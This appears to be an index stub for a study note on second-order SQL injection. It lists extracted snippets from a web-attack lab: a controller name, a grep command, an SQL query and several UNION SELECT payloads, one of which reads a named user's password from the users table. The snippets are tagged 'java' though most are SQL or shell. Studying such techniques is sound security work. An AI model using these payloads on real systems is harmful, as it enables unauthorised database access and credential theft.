...
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques/Second-Order SQLi.md"
source_sha256: "3c692a794911953a690239bdb7ab69c78ae9c12b9bfdfa980e102520fd9f1a24"
curator_version: 2
...
- `java: // ProfileController.java`
- `java: grep -irnE 'UPDATE.*email'`
- `java: @PostMapping({"/profile/edit"})`
- `java: SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, au`
- `java: ' UNION SELECT 1,2,3,4,5--`
- `java: ' UNION SELECT '1','2','3','4',5--`
- `java: email='+UNION+SELECT+password,'2','3','4',5+from+users+where+username='betrayedApples3'--&`
...
## Source
Original note: `_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques/Second-Order SQLi.md`
